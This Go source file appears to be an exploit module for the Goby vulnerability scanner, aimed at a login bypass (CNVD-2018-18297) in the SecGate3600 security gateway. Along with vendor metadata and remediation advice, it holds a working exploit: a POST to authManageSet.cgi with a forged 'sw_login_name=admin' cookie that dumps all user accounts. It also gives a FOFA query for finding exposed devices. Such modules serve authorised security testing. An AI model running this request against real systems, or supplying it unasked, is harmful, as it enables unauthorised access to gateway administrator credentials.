package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "SECWORLD SecGate3600 authManageSet.cgi Api Login Bypass",
    "Description": "<p>SecGate3600 is a security gateway product of Netsun Information Technology (Beijing) Co., Ltd.</p><p>SECWORLD SecGate3600 has a login bypass vulnerability, and attackers can use this vulnerability to obtain sensitive information such as administrator passwords and further control the system.</p>",
    "Impact": "<p>SECWORLD SecGate3600 Login Bypass (CNVD-2018-18297)</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.legendsec.com\">https://www.legendsec.com</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "Product": "legendsec-Secgate3600-NSG-Safety-Gateway-SSL-VPN",
    "VulType": [
        "Permission Bypass"
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "Translation": {
        "CN": {
            "Name": "网神 SecGate3600 authManageSet.cgi 接口登录绕过漏洞",
            "Product": "网神SecGate3600-NSG安全网关SSL-VPN",
            "Description": "<p>SecGate3600是网神信息技术(北京)股份有限公司旗下一款安全网关产品。</p><p>网神 SecGate3600 存在登录绕过漏洞，攻击者利用该漏洞可获取管理员密码等敏感信息，进一步控制系统。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新： <a href=\"https://www.legendsec.com\">https://www.legendsec.com</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Impact": "<p>网神 SecGate3600 存在登录绕过漏洞，攻击者利用该漏洞可获取管理员密码等敏感信息，进一步控制系统。</p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "SECWORLD SecGate3600 authManageSet.cgi Api Login Bypass",
            "Product": "legendsec-Secgate3600-NSG-Safety-Gateway-SSL-VPN",
            "Description": "<p>SecGate3600 is a security gateway product of Netsun Information Technology (Beijing) Co., Ltd.</p><p>SECWORLD SecGate3600 has a login bypass vulnerability, and attackers can use this vulnerability to obtain sensitive information such as administrator passwords and further control the system.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.legendsec.com\">https://www.legendsec.com</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>SECWORLD SecGate3600 Login Bypass (CNVD-2018-18297)</p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "FofaQuery": "body=\"sec_gate_image/login_02.gif\"",
    "GobyQuery": "body=\"sec_gate_image/login_02.gif\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://www.legendsec.com/",
    "DisclosureDate": "2018-10-04",
    "References": [
        "https://www.cnvd.org.cn/flaw/show/CNVD-2018-18297"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "8.0",
    "CVEIDs": [],
    "CNVD": [
        "CNVD-2018-18297"
    ],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "CVSSScore": "7.6",
    "PocId": "10257"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri1 := "/cgi-bin/authUser/authManageSet.cgi"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("Cookie", "sw_login_name=admin")
			cfg1.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg1.Data = `type=getAllUsers&_search=false&nd=1645000391264&rows=-1&page=1&sidx=&sord=asc`
			if resp1, err := httpclient.DoHttpRequest(u, cfg1); err == nil {
				return resp1.StatusCode == 200 && strings.Contains(resp1.RawBody, "</cell>") && strings.Contains(resp1.RawBody, "admin")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uri1 := "/cgi-bin/authUser/authManageSet.cgi"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("Cookie", "sw_login_name=admin")
			cfg1.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg1.Data = `type=getAllUsers&_search=false&nd=1645000391264&rows=-1&page=1&sidx=&sord=asc`
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil {
				if resp.StatusCode == 200 {
					expResult.Output = resp.RawBody
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
